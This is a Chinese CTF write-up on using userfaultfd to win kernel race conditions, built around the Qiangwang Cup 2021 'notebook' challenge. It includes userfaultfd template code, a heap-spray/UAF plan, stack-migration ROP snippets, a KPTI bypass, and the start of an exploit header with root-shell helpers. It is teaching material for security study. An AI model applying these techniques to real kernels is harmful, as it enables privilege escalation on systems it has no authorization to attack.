# 从强网杯 2021 线上赛题目 notebook 中浅析 userfaultfd 在 kernel pwn 中的利用

阅读量 **504313**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-30 10:30:02

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01f5a4f4595d4ae470.jpg)

## 0x00.一切开始之前

条件竞争漏洞算是日常生活中较为常见的一个漏洞，也是当前 CTF 中 Linux kernel pwn 中较为热门的方向之一

但多个线程之间的竞争总归是命中率较低，从而无法让攻击者很好地完成利用，为了能够成功、稳定地达成 race，`userfaultfd`
这一冷门系统调用逐渐走入大众视野

笔者今天就借助强网杯2021线上赛的 notebook 一题简单讲讲 userfaultfd 在 kernel pwn 中的利用手法

## 0x01.userfaultfd 系统调用

严格意义而言 userfaultfd 并非是一种利用手法， **而是 Linux 的一个系统调用** ，简单来说，通过 userfaultfd 这种机制，
**用户可以通过自定义的 page fault handler 在用户态处理缺页异常**

下面的这张图很好地体现了 userfaultfd 的整个流程：

![](https://p3.ssl.qhimg.com/t01938a7f50e9c27b9a.png)

要使用 userfaultfd 系统调用，我们首先要注册一个 userfaultfd，通过 ioctl
监视一块内存区域，同时还需要专门启动一个用以进行轮询的线程 `uffd monitor`，该线程会通过 `poll()` 函数不断轮询
**直到出现缺页异常**

  * 当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 faulting 线程）进入到内核中处理缺页异常
  * 内核会调用 `handle_userfault()` 交由 userfaultfd 处理
  * 随后 faulting 线程进入堵塞状态，同时将一个 `uffd_msg` 发送给 monitor 线程，等待其处理结束
  * monitor 线程调用通过 ioctl 处理缺页异常，有如下选项： 
    * `UFFDIO_COPY`：将用户自定义数据拷贝到 faulting page 上
    * `UFFDIO_ZEROPAGE` ：将 faulting page 置0
    * `UFFDIO_WAKE`：用于配合上面两项中 `UFFDIO_COPY_MODE_DONTWAKE` 和 `UFFDIO_ZEROPAGE_MODE_DONTWAKE` 模式实现批量填充
  * 在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作

以上便是 userfaultfd 这个机制的整个流程，该机制最初被设计来用以进行虚拟机/进程的迁移等用途

###  userfaultfd 与条件竞争

看起来 userfaultfd 只是一个常规的与处理缺页异常相关的系统调用，但是
**通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高**

考虑在内核模块当中有一个菜单堆的情况，其中的操作都没有加锁，存在条件竞争的可能，考虑如下竞争情况：

  * 线程1不断地分配与编辑堆块
  * 线程2不断地释放堆块

此时线程1便 **有可能编辑到被释放的堆块** ，若是此时恰好我们又将这个堆块申请到了合适的位置（比如说
tty_operations），那么我们便可以控制程序执行流（也可以是编辑释放后堆块的 fd，然后实现任意地址写）

但是毫无疑问的是，若是直接开两个线程进行竞争，命中的几率是比较低的，我们也很难判断是否命中

但假如线程1使用注诸如 `copy_from_user` 等方法从用户空间向内核空间拷贝数据，那么我们便可以先用 mmap 分一块匿名内存，为其注册
userfaultfd，之后 **线程1在内核中触发缺页异常时便会陷入阻塞，此时我们便可以开另一个线程将这块内存释放掉，然后再分配到我们想要的地方**
（比如说 tty_operations），此时再让线程1继续执行，便能向我们想要读写的目标读写特定数据了， **这使得条件竞争的命中率大幅提高**

###  userfaultfd 的具体用法

> 以下代码参考自 Linux man page，略有改动

首先定义接下来需要用到的一些数据结构

    
    
    #include <sys/types.h>
    #include <stdio.h>
    #include <linux/userfaultfd.h>
    #include <pthread.h>
    #include <errno.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <poll.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/syscall.h>
    #include <sys/ioctl.h>
    #include <poll.h>
    
    void errExit(char * msg)
    {
        puts(msg);
        exit(-1);
    }
    //...
    
    long uffd;          /* userfaultfd file descriptor */
    char *addr;         /* Start of region handled by userfaultfd */
    unsigned long len;  /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    

首先通过 userfaultfd 系统调用注册一个 userfaultfd，其中 `O_CLOEXEC` 和 `O_NONBLOCK` 和 open 的
flags 相同，笔者个人认为这里可以理解为我们创建了一个虚拟设备 `userfault`

这里用 mmap 分一个匿名页用作后续被监视的区域

    
    
    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");
    
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");
    
    /* Create a private anonymous mapping. The memory will be
        demand-zero paged--that is, not yet allocated. When we
        actually touch the memory, it will be allocated via
        the userfaultfd. */
    len = 0x1000;
    addr = (char*) mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
        errExit("mmap");
    

为这块内存区域注册 userfaultfd

    
    
    /* Register the memory range of the mapping we just created for
        handling by the userfaultfd object. In mode, we request to track
        missing pages (i.e., pages that have not yet been faulted in). */
    
    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");
    

启动 monitor 轮询线程，整个 userfaultfd 的启动流程就结束了，接下来便是等待缺页异常的过程

    
    
    /* Create a thread that will process the userfaultfd events */
    int s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        errExit("pthread_create");
    }
    

monitor 轮询线程应当定义如下形式，这里给出的是 UFFD_COPY，即将自定义数据拷贝到 faulting page 上：

    
    
    static int page_size;
    
    static void *
    fault_handler_thread(void *arg)
    {
        static struct uffd_msg msg;   /* Data read from userfaultfd */
        static int fault_cnt = 0;     /* Number of faults so far handled */
        long uffd;                    /* userfaultfd file descriptor */
        static char *page = NULL;
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
    
        page_size = sysconf(_SC_PAGE_SIZE);
    
        uffd = (long) arg;
    
        /* Create a page that will be copied into the faulting region */
    
        if (page == NULL) 
        {
            page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (page == MAP_FAILED)
                errExit("mmap");
        }
    
        /* Loop, handling incoming events on the userfaultfd
            file descriptor */
    
        for (;;) 
        {
            /* See what poll() tells us about the userfaultfd */
    
            struct pollfd pollfd;
            int nready;
            pollfd.fd = uffd;
            pollfd.events = POLLIN;
            nready = poll(&pollfd, 1, -1);
            if (nready == -1)
                errExit("poll");
    
            printf("\nfault_handler_thread():\n");
            printf("    poll() returns: nready = %d; "
                    "POLLIN = %d; POLLERR = %d\n", nready,
                    (pollfd.revents & POLLIN) != 0,
                    (pollfd.revents & POLLERR) != 0);
    
            /* Read an event from the userfaultfd */
    
            nread = read(uffd, &msg, sizeof(msg));
            if (nread == 0)
            {
                printf("EOF on userfaultfd!\n");
                exit(EXIT_FAILURE);
            }
    
            if (nread == -1)
                errExit("read");
    
            /* We expect only one kind of event; verify that assumption */
    
            if (msg.event != UFFD_EVENT_PAGEFAULT)
            {
                fprintf(stderr, "Unexpected event on userfaultfd\n");
                exit(EXIT_FAILURE);
            }
            /* Display info about the page-fault event */
    
            printf("    UFFD_EVENT_PAGEFAULT event: ");
            printf("flags = %llx; ", msg.arg.pagefault.flags);
            printf("address = %llx\n", msg.arg.pagefault.address);
    
            /* Copy the page pointed to by 'page' into the faulting
                region. Vary the contents that are copied in, so that it
                is more obvious that each fault is handled separately. */
    
            memset(page, 'A' + fault_cnt % 20, page_size);
            fault_cnt++;
    
            uffdio_copy.src = (unsigned long) page;
    
            /* We need to handle page faults in units of pages(!).
            So, round faulting address down to page boundary */
    
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
            uffdio_copy.len = page_size;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
    
            printf("        (uffdio_copy.copy returned %lld)\n",
                   uffdio_copy.copy);
        }
    }
    

有人可能注意到了 `uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
~(page_size - 1);` 这个奇怪的句子，在这里作用是将触发缺页异常的地址 **按页对齐** 作为后续拷贝的起始地址

> 比如说触发的地址可能是 0xdeadbeef，直接从这里开始拷贝一整页的数据就拷歪了，应当从 0xdeadb000 开始拷贝（假设页大小 0x1000）

**例程**

测试例程如下：

    
    
    #include <sys/types.h>
    #include <stdio.h>
    #include <linux/userfaultfd.h>
    #include <pthread.h>
    #include <errno.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <poll.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/syscall.h>
    #include <sys/ioctl.h>
    #include <poll.h>
    
    static int page_size;
    
    void errExit(char * msg)
    {
        printf("[x] Error at: %s\n", msg);
        exit(-1);
    }
    
    static void *
    fault_handler_thread(void *arg)
    {
        static struct uffd_msg msg;   /* Data read from userfaultfd */
        static int fault_cnt = 0;     /* Number of faults so far handled */
        long uffd;                    /* userfaultfd file descriptor */
        static char *page = NULL;
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
    
        uffd = (long) arg;
    
        /* Create a page that will be copied into the faulting region */
    
        if (page == NULL) 
        {
            page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (page == MAP_FAILED)
                errExit("mmap");
        }
    
        /* Loop, handling incoming events on the userfaultfd
            file descriptor */
    
        for (;;) 
        {
            /* See what poll() tells us about the userfaultfd */
    
            struct pollfd pollfd;
            int nready;
            pollfd.fd = uffd;
            pollfd.events = POLLIN;
            nready = poll(&pollfd, 1, -1);
            if (nready == -1)
                errExit("poll");
    
            printf("\nfault_handler_thread():\n");
            printf("    poll() returns: nready = %d; "
                    "POLLIN = %d; POLLERR = %d\n", nready,
                    (pollfd.revents & POLLIN) != 0,
                    (pollfd.revents & POLLERR) != 0);
    
            /* Read an event from the userfaultfd */
    
            nread = read(uffd, &msg, sizeof(msg));
            if (nread == 0)
            {
                printf("EOF on userfaultfd!\n");
                exit(EXIT_FAILURE);
            }
    
            if (nread == -1)
                errExit("read");
    
            /* We expect only one kind of event; verify that assumption */
    
            if (msg.event != UFFD_EVENT_PAGEFAULT)
            {
                fprintf(stderr, "Unexpected event on userfaultfd\n");
                exit(EXIT_FAILURE);
            }
            /* Display info about the page-fault event */
    
            printf("    UFFD_EVENT_PAGEFAULT event: ");
            printf("flags = %llx; ", msg.arg.pagefault.flags);
            printf("address = %llx\n", msg.arg.pagefault.address);
    
            /* Copy the page pointed to by 'page' into the faulting
                region. Vary the contents that are copied in, so that it
                is more obvious that each fault is handled separately. */
    
            memset(page, 'A' + fault_cnt % 20, page_size);
            fault_cnt++;
    
            uffdio_copy.src = (unsigned long) page;
    
            /* We need to handle page faults in units of pages(!).
            So, round faulting address down to page boundary */
    
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
            uffdio_copy.len = page_size;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
    
            printf("        (uffdio_copy.copy returned %lld)\n",
                   uffdio_copy.copy);
        }
    }
    
    
    int main(int argc, char ** argv, char ** envp)
    {
        long uffd;          /* userfaultfd file descriptor */
        char *addr;         /* Start of region handled by userfaultfd */
        unsigned long len;  /* Length of region handled by userfaultfd */
        pthread_t thr;      /* ID of thread that handles page faults */
        struct uffdio_api uffdio_api;
        struct uffdio_register uffdio_register;
    
        page_size = sysconf(_SC_PAGE_SIZE);
    
        /* Create and enable userfaultfd object */
        uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
        if (uffd == -1)
            errExit("userfaultfd");
    
        uffdio_api.api = UFFD_API;
        uffdio_api.features = 0;
        if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
            errExit("ioctl-UFFDIO_API");
    
        /* Create a private anonymous mapping. The memory will be
            demand-zero paged--that is, not yet allocated. When we
            actually touch the memory, it will be allocated via
            the userfaultfd. */
        len = 0x1000;
        addr = (char*) mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (addr == MAP_FAILED)
            errExit("mmap");
    
        /* Register the memory range of the mapping we just created for
        handling by the userfaultfd object. In mode, we request to track
        missing pages (i.e., pages that have not yet been faulted in). */
    
        uffdio_register.range.start = (unsigned long) addr;
        uffdio_register.range.len = len;
        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
        if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
            errExit("ioctl-UFFDIO_REGISTER");
    
        /* Create a thread that will process the userfaultfd events */
        int s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
        if (s != 0)
            errExit("pthread_create");
    
        /* Trigger the userfaultfd event */
        void * ptr = (void*) *(unsigned long long*) addr;
        printf("Get data: %p\n", ptr);
    
        return 0;
    }
    

起个虚拟机跑一下，我们可以看到在我们监视的匿名页内成功地被我们写入了想要的数据

![](https://p5.ssl.qhimg.com/t019368a80e81a8f412.png)

###  新版本内核对抗 userfaultfd 在 race condition 中的利用

正所谓“没有万能的银弹”，可能有的人会发现在较新版本的内核中 userfaultfd 系统调用无法成功启动：

![](https://p5.ssl.qhimg.com/t0125f8b0e83dace747.png)

这是因为在较新版本的内核中为 userfaultfd 添加了一些限制：

> 来自 linux-5.11 源码`fs/userfaultfd.c`：
    
    
    SYSCALL_DEFINE1(userfaultfd, int, flags)
    {
        struct userfaultfd_ctx *ctx;
        int fd;
    
        if (!sysctl_unprivileged_userfaultfd &&
            (flags & UFFD_USER_MODE_ONLY) == 0 &&
            !capable(CAP_SYS_PTRACE)) {
            printk_once(KERN_WARNING "uffd: Set unprivileged_userfaultfd "
                "sysctl knob to 1 if kernel faults must be handled "
                "without obtaining CAP_SYS_PTRACE capability\n");
            return -EPERM;
        }
    //...
    

这或许意味着刚刚进入大众视野的 userfaultfd 可能又将逐渐淡出大众视野（ ~~微博@来去之间~~ ），但不可否认的是，userfaultfd
确乎为我们在 Linux kernel 中的条件竞争利用提供了一个全新的思路与一种极其稳定的利用手法

###  CTF 中的 userfaultfd 板子

userfaultfd 的整个操作流程比较繁琐，故笔者现给出如下板子：

    
    
    static pthread_t monitor_thread;
    
    void errExit(char * msg)
    {
        printf("[x] Error at: %s\n", msg);
        exit(EXIT_FAILURE);
    }
    
    void registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))
    {
        long uffd;
        struct uffdio_api uffdio_api;
        struct uffdio_register uffdio_register;
        int s;
    
        /* Create and enable userfaultfd object */
        uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
        if (uffd == -1)
            errExit("userfaultfd");
    
        uffdio_api.api = UFFD_API;
        uffdio_api.features = 0;
        if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
            errExit("ioctl-UFFDIO_API");
    
        uffdio_register.range.start = (unsigned long) addr;
        uffdio_register.range.len = len;
        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
        if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
            errExit("ioctl-UFFDIO_REGISTER");
    
        s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
        if (s != 0)
            errExit("pthread_create");
    }
    

在使用时直接调用即可：

    
    
    registerUserFaultFd(addr, len, handler);
    

需要注意的是 handler 的写法，这里直接照抄 Linux man page 改了改，可以根据个人需求进行个性化改动：

    
    
    static char *page = NULL; // 你要拷贝进去的数据
    static long page_size;
    
    static void *
    fault_handler_thread(void *arg)
    {
        static struct uffd_msg msg;
        static int fault_cnt = 0;
        long uffd;
    
        struct uffdio_copy uffdio_copy;
        ssize_t nread;
    
        uffd = (long) arg;
    
        for (;;) 
        {
            struct pollfd pollfd;
            int nready;
            pollfd.fd = uffd;
            pollfd.events = POLLIN;
            nready = poll(&pollfd, 1, -1);
    
            /*
             * [在这停顿.jpg]
             * 当 poll 返回时说明出现了缺页异常
             * 你可以在这里插入一些自定义的代码，比如说获取锁或者 sleep() 一类的操作
             * 让他在你想要的地方停顿，之后你再手动唤醒（或者就这样卡住）
             */
    
            if (nready == -1)
                errExit("poll");
    
            nread = read(uffd, &msg, sizeof(msg));
    
            if (nread == 0)
                errExit("EOF on userfaultfd!\n");
    
            if (nread == -1)
                errExit("read");
    
            if (msg.event != UFFD_EVENT_PAGEFAULT)
                errExit("Unexpected event on userfaultfd\n");
    
            uffdio_copy.src = (unsigned long) page;
            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
            uffdio_copy.len = page_size;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
        }
    }
    

## 0x02.强网杯2021线上赛 – notebook

###  简单分析

首先看一下启动脚本

    
    
    #!/bin/sh
    stty intr ^]
    exec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append "loglevel=3 console=ttyS0 oops=panic panic=1 kaslr" -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2>/dev/null -s
    

开了 smap、smep、kaslr 保护

查看 `/sys/devices/system/cpu/vulnerabilities/`

![](https://p3.ssl.qhimg.com/t01d431569b1fcfe673.png)

开启了 KPTI （内核页表隔离）

给了一个 LKM 叫 `notebook.ko`，按惯例这应当就是有漏洞的模块了，拖入 IDA 进行分析

大致是创建了一个 misc 类型的设备，并自定义了 ioctl、read、write 三个接口

![](https://p0.ssl.qhimg.com/t012a4a9fecc534e31e.png)

**1）note 结构体**

定义了一个结构体 `note`，有着两个成员：size 存储 cache 的大小，buf 存储指向对应 cache 的指针

![](https://p2.ssl.qhimg.com/t016bb41cd9f48c35ba.png)

    
    
    typedef struct
    {
        size_t size;
        char * buf;
    }note;
    

**2）mynote_ioctl**

对于 ioctl 通信，该模块模拟了一个菜单（ ~~又是菜单堆~~ ），提供了创建、编辑、释放内存的功能

![](https://p1.ssl.qhimg.com/t018392b05a42a0b892.png)

我们需要传入的参数为如下结构体：

    
    
    typedef struct 
    {
        size_t idx;
        size_t size;
        char * buf;
    }userarg;
    

**noteadd()**

noteadd() 会向 slub 申请 object，其中限制了我们只能够分配 0x60 以下的 note，此时不会直接将用户数据拷贝到刚分配的 note
中，而是拷贝到全局变量字符数组 `name` 中

![](https://p1.ssl.qhimg.com/t01ee8ee56d88016ffc.png)

**notedel()**

这个函数主要用处是释放先前分配的 note

注意到在 notedel() 函数中若是 size 为 0 则不会清空，不过与 ptmalloc 所不同的是，kmalloc(0) 并不会返回 object

这里还有一个读写锁，不过 add 和 edit 占用的是 **读** 位，而 delete 占用的是 **写**
位，通俗地说便是：读锁可以被多个进程使用，多个进程此时可以同时进入临界区，而写锁只能被一个进程使用，只有一个进程能够进入临界区

![](https://p0.ssl.qhimg.com/t01bccc5526bcff1fc0.png)

**noteedit()**

编辑我们的 notebook 中的 object，若是 size 不同则会调用 krealloc，并将用户空间数据拷贝 256 字节至全局变量 name
中，否则直接返回，与 add 所不同的是 edit 并不会限制 size 大小，因此 **虽然 add 限制了 size，但是通过 edit
我们仍能获得任意大小的 object**

在这里存在一个漏洞：edit 使用的是读锁，可以多个进程并发 `realloc(buf, 0)` ，通过条件竞争达到 double free 的效果

![](https://p5.ssl.qhimg.com/t015b97fea9e4252774.png)

**notegift()**

notegift() 函数会白给出分配的 note 的地址

![](https://p3.ssl.qhimg.com/t01e910eb49c74803d6.png)

**3）mynote_read**

很普通的读取对应 note 内容的功能，读取的大小为 notebook 结构体数组中存的 size，下标为 read 传入的第三个参数

![](https://p0.ssl.qhimg.com/t01f9f52f02245ea24a.png)

**4）mynote_write**

很普通的写入对应 note 内容的功能，写入的大小为 notebook 结构体数组中存的 size，下标为 write 传入的第三个参数

![](https://p1.ssl.qhimg.com/t013c8fa2339891ace8.png)

###  解法一：userfaultfd + heap spray + Kernel UAF + stack migration + KPTI bypass

**1）userfaultfd 构造 UAF**

考虑到在 mynote_edit 当中使用了 krealloc 来重分配 object，随后使用 copy_fom_user
从用户空间拷贝数据，那么这里我们可以先分配一个 tty_struct 大小的 note，之后 **新开 edit 线程通过 krealloc
一个较大的数将其释放** ，并通过 userfaultfd 让 mynote_edit 卡在这里， **此时 notebook 数组中的 object
尚未被清空，仍是原先被释放了的 object**

![](https://p1.ssl.qhimg.com/t012d9729a81dc518b6.png)

接下来我们进行 **堆喷射** ：多次打开 `/dev/ptmx`，由此我们便有可能 **将刚释放的 object 申请到 tty_struct 中**

但在 read 和 write 中都会用 `_check_object_size` 检查 size 与 buf 大小是否匹配，在 mynote_add
当中限制了 size 应当不大于 0x60，而我们在 mynote_edit 中的释放操作之前会将 size 改掉

![](https://p1.ssl.qhimg.com/t013496fafebd2de2ba.png)

考虑到在 mynote_add 中先用 copy_from_user 拷贝数据后才调用 kmalloc，故这里还是可以新开 add 线程让 size
合法后通过 userfaultfd 让其卡在这里

![](https://p3.ssl.qhimg.com/t0160c6c22117d7a0ac.png)

> 我们可以通过检查 object 开头的数据是否为 tty 魔数 `0x5401` 判断是否分配到了 tty_struct

**2）泄露内核地址**

由于我们已经获得了一个 tty_struct，故可以直接通过 tty_struct 中的 tty_operations 泄露地址

**ptm_unix98_ops&& pty_unix98_ops**

在 ptmx 被打开时内核通过 `alloc_tty_struct()` 分配 tty_struct 的内存空间，之后会将 tty_operations
初始化为 **全局变量** `ptm_unix98_ops` 或 `pty_unix98_ops`，在调试阶段我们可以先关掉 kaslr 开 root 从
`/proc/kallsyms` 中读取其偏移

开启了 kaslr 的内核在内存中的偏移依然以内存页为粒度，故我们可以通过比对 tty_operations 地址的低三16进制位来判断是
ptm_unix98_ops 还是 pty_unix98_ops

**3）劫持 tty_operations**

由于题目开启了 smap 保护，我们不能够直接将 fake tty_operations 放置到用户空间当中，但 notegift() 会白给出
notebook 里存的 note 的地址，那么我们可以把 fake tty_operations 布置到 note 当中

接下来进行栈迁移的工作，我们这里考虑劫持 tty_operations->write，简单下个断点看看环境：

![](https://p2.ssl.qhimg.com/t0126999a227924f45b.png)

可以发现当程序运行到这里时 rdi 寄存器中存储的刚好是 tty_struct 的地址，笔者选择通过下面这条 gadget 将栈迁移到
tty_struct：

![](https://p3.ssl.qhimg.com/t019ede129976cdef7d.png)

tty_struct 比较小，而且很多数据不能动，这里笔者再进行第二次栈迁移迁回 tty_operations：

![](https://p2.ssl.qhimg.com/t0108f1343336821c48.png)

tty_operation 开头到 write 的空间比较小，笔者选择再进行第三次栈迁移到一个 note 中，在那里完成我们的 ROP

    
    
        // first migration to tty_struct
        ((struct tty_operations *)fake_tty_ops_data)->write = PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;
    
        // second migration back to tty_operations
        fake_tty_data[1] = POP_RBX_POP_RBP_RET + kernel_offset;
        fake_tty_data[3] = notebook[fake_tty_ops_idx].buf;
        fake_tty_data[4] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;
    
        // third migration to a note
        fake_tty_ops_data[1] = POP_RBP_RET + kernel_offset;
        fake_tty_ops_data[2] = notebook[fake_stack_idx].buf;
        fake_tty_ops_data[3] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;
    

**4）KPTI bypass**

由于开启了 KPTI（内核页表隔离），故我们在返回用户态之前还需要将我们的用户进程的页表给切换回来

众所周知 Linux 采用 **四级页表** 结构（PGD->PUD->PMD->PTE），而 CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启
KPTI 的情况下用户态与内核态之间的切换便涉及到 CR3 的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD
两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址），这样 **只需要将 CR3 的第 13
位取反便能完成页表切换的操作**

![](https://p3.ssl.qhimg.com/t0177f66d2b1665ea72.png)

内核也相应地在 `arch/x86/entry/entry_64.S` 中提供了一个用于完成内核态到用户态切换的函数
`swapgs_restore_regs_and_return_to_usermode`，地址可以在 `/proc/kallsyms` 中获得

AT&T 汇编比较反人类，推荐直接查看 IDA 的反汇编结果：

![](https://p0.ssl.qhimg.com/t0124b394cc21b8a107.png)

在实际操作时前面的一些栈操作都可以跳过，直接从 `mov rdi, rsp` 开始，这个函数大概可以总结为如下操作：

    
    
    mov        rdi, cr3
    or         rdi, 0x1000
    mov     cr3, rdi
    pop        rax
    pop        rdi
    swapgs
    iretq
    

因此我们只需要布置出如下栈布局即可：

    
    
    ↓    swapgs_restore_regs_and_return_to_usermode
        0 // padding
        0 // padding
        user_shell_addr
        user_cs
        user_rflags
        user_sp
        user_ss
    

最终的 exp 如下：

> kernelpwn.h
    
    
    #include <sys/types.h>
    #include <stdio.h>
    #include <linux/userfaultfd.h>
    #include <pthread.h>
    #include <errno.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <poll.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/syscall.h>
    #include <sys/ioctl.h>
    #include <sys/sem.h>
    #include <semaphore.h>
    #include <poll.h>
    
    void * kernel_base = 0xffffffff81000000;
    size_t kernel_offset = 0;
    
    static pthread_t monitor_thread;
    
    void errExit(char * msg)
    {
        printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
        exit(EXIT_FAILURE);
    }
    
    void registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))
    {
        long uffd;
        struct uffdio_api uffdio_api;
        struct uffdio_register uffdio_register;
        int s;
    
        /* Create and enable userfaultfd object */
        uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
        if (uffd == -1)
            errExit("userfaultfd");
    
        uffdio_api.api = UFFD_API;
        uffdio_api.features = 0;
        if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
            errExit("ioctl-UFFDIO_API");
    
        uffdio_register.range.start = (unsigned long) addr;
        uffdio_register.range.len = len;
        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
        if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
            errExit("ioctl-UFFDIO_REGISTER");
    
        s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
        if (s != 0)
            errExit("pthread_create");
    }
    
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    
    size_t commit_creds = NULL, prepare_kernel_cred = NULL;
    void getRootPrivilige(void)
    {
        void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
        int (*commit_creds_ptr)(void *) = commit_creds;
        (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
    }
    
    void getRootShell(void)
    {   
        puts("\033[32m\033[1m[+] Backing from the kernelspace.\033[0m");
    
        if(getuid())
        {
            puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
            exit(-1);
        }
    
        puts("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m");
        system("/bin/sh");
    }
    
    /* ------ kernel structure ------ */
    
    struct file_operations;
    struct tty_struct;
    struct tty_driver;
    struct serial_icounter_struct;
    
    struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
                struct file *filp, int idx);
        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int  (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int  (*write)(struct tty_struct * tty,
                  const unsigned char *buf, int count);
        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        int  (*write_room)(struct tty_struct *tty);
        int  (*chars_in_buffer)(struct tty_struct *tty);
        int  (*ioctl)(struct tty_struct *tty,
                unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
                     unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
                unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
